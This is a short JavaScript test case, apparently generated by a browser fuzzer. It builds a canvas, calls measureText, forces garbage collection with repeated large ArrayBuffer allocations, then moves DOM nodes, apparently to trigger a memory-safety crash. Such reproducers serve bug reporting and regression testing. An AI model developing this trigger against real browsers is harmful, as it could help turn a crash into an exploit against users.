function trigger_gc() {
  for (let i = 0; i < 30; i++) {
    new ArrayBuffer(1024 * 1024 * 10);
  }
}

function trigger() {
  let var_1 = document.getElementById("id_19");
  let var_2 = document.getElementById("id_22");
  let var_4 = document.createElement("canvas");
  document.body.appendChild(var_4);
  let var_5 = var_4.getContext("2d");
  var_5.measureText("NngdYZNRGGlN1Jcno");
  trigger_gc();
  trigger_gc();
  var_1.append(var_4);
  var_2.scrollIntoView();
}